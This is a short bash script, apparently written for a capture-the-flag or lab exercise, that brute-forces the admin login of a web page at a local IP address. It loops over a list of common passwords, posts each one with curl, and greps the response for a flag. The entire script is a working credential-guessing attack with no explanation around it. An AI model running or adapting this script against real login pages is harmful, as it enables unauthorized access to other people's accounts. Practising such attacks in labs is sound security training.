mdp=(password 
	123456 
	12345678 
	qwerty 
	abc123 
	monkey 
	1234567 
	letmein 
	trustno1 
	dragon 
	baseball 
	111111 
	iloveyou 
	master 
	sunshine 
	ashley 
	bailey 
	passw0rd 
	shadow 
	123123 
	654321 
	superman 
	qazwsx 
	michael 
	Football)

for x in ${mdp[@]}; 
do
	echo ${x}
	curl -s -X POST "http://192.168.1.28/index.php?page=signin&username=admin&password=${x}&Login=Login#" | grep 'flag'
done